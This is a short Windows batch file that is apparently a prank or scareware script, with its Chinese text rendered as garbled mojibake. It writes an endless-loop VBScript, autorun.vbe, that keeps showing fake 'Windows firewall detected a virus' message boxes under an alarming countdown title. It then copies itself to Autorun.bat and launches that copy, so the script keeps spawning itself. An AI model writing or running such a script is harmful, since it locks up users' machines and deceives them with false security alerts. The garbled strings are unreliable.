@echo off
color 9f
title=                                                   ���棺ϵͳ��10���ڽ����ױ���
mode con cols=300 lines=1
@echo 
do
msgbox chr(13) + chr(13) + chr(13) + "Windowϵͳ����ǽ��⵽��没�����ף���ߣڣ����ϵͳ������������"
loop>autorun.vbe
start autorun.vbe
copy %0 Autorun.bat
start Autorun.bat
